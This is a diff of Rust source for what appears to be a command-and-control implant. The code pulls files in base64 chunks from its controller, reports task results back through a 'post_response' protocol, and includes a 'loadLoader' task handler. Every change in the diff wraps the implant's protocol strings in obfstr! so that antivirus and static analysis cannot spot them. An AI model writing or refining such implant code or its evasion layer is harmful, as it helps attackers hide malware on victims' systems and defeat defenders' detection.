@@ -2,6 +2,7 @@ use serde::Deserialize;
 use serde_json::{Value, json};
 use base64::engine::general_purpose;
 use base64::Engine;
+use obfstr::obfstr;
 
 const CHUNK_SIZE: usize = 4096;
 
@@ -20,22 +21,22 @@ fn download_file(task_id: &str, file_id: &str) -> Result<Vec<u8>, Box<dyn std::e
 
     while chunk_num <= total_chunks {
         let payload = json!({
-            "action": "post_response",
-            "responses": [{
-                "upload": {
-                    "chunk_size": CHUNK_SIZE,
-                    "file_id": file_id,
-                    "chunk_num": chunk_num,
+            obfstr!("action"): obfstr!("post_response"),
+            obfstr!("responses"): [{
+                obfstr!("upload"): {
+                    obfstr!("chunk_size"): CHUNK_SIZE,
+                    obfstr!("file_id"): file_id,
+                    obfstr!("chunk_num"): chunk_num,
                 },
-                "task_id": task_id,
-                "completed": true
+                obfstr!("task_id"): task_id,
+                obfstr!("completed"): true
             }]
         })
         .to_string();
         let resp: Value = crate::transport::send_request_with_response(&payload)?;
-        let entry = &resp["responses"][0];
-        total_chunks = entry["total_chunks"].as_u64().ok_or("Bad `total_chunks`")? as usize;
-        let chunk_data = entry["chunk_data"].as_str().ok_or("Missing `chunk_data`")?;
+        let entry = &resp[obfstr!("responses")][0];
+        total_chunks = entry[obfstr!("total_chunks")].as_u64().ok_or("Bad `total_chunks`")? as usize;
+        let chunk_data = entry[obfstr!("chunk_data")].as_str().ok_or("Missing `chunk_data`")?;
         let bytes = general_purpose::STANDARD.decode(chunk_data)?;
         file_bytes.extend_from_slice(&bytes);
         chunk_num += 1;
@@ -72,12 +73,12 @@ pub fn loadLoader(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
     };
 
     let done = json!({
-        "action": "post_response",
-        "responses": [{
-            "task_id": id,
-            "user_output": output,
-            "status": "success",
-            "completed": true
+        obfstr!("action"): obfstr!("post_response"),
+        obfstr!("responses"): [{
+            obfstr!("task_id"): id,
+            obfstr!("user_output"): output,
+            obfstr!("status"): "success",
+            obfstr!("completed"): true
         }]
     })
     .to_string();
